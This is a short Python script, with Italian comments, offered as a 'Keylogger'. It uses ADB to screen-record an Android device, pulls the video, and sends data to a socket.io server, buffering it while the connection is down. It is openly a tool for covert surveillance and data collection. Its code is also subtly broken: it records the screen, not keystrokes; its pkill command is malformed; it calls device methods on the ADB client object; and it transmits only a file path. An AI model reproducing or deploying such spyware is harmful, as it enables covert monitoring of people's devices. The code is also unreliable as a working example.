import adbutils
import socketio
import threading
import time

class Keylogger:
    def __init__(self, server_url):
        self.adb = adbutils.AdbClient(host="127.0.0.1", port=5037)
        self.sio = socketio.Client()
        self.buffer = []
        self.server_url = server_url
        self._setup_socketio()

    def _setup_socketio(self):
        @self.sio.event
        def connect():
            print('Connection established')
            # Invia i dati bufferizzati al server dopo la riconnessione
            while self.buffer:
                self.sio.emit('keylogger_data', self.buffer.pop(0))

        @self.sio.event
        def disconnect():
            print('Disconnected from server')

        @self.sio.event
        def connect_error(data):
            print(f'Failed to connect to server: {data}')

        self.sio.connect(self.server_url)

    def start_logging(self):
        self.adb.shell("screenrecord /sdcard/screenrecord.mp4")
        print('Keylogger started')

    def stop_logging(self):
        self.adb.shell("pkill -l SIGINT screenrecord")
        print('Keylogger stopped')

    def get_recordings(self):
        local_file_path = "screenrecord.mp4"
        self.adb.pull("/sdcard/screenrecord.mp4", local_file_path)
        print(f'Recording saved to {local_file_path}')
        return local_file_path

    def send_data(self, data):
        if self.sio.connected:
            self.sio.emit('keylogger_data', data)
        else:
            self.buffer.append(data)

    def disconnect(self):
        self.sio.disconnect()

# Esempio di utilizzo
if __name__ == "__main__":
    keylogger = Keylogger('http://localhost:12345')
    keylogger.start_logging()
    time.sleep(10)  # Registra per 10 secondi
    keylogger.stop_logging()
    recording_path = keylogger.get_recordings()
    keylogger.send_data({'recording_path': recording_path})
    keylogger.disconnect()
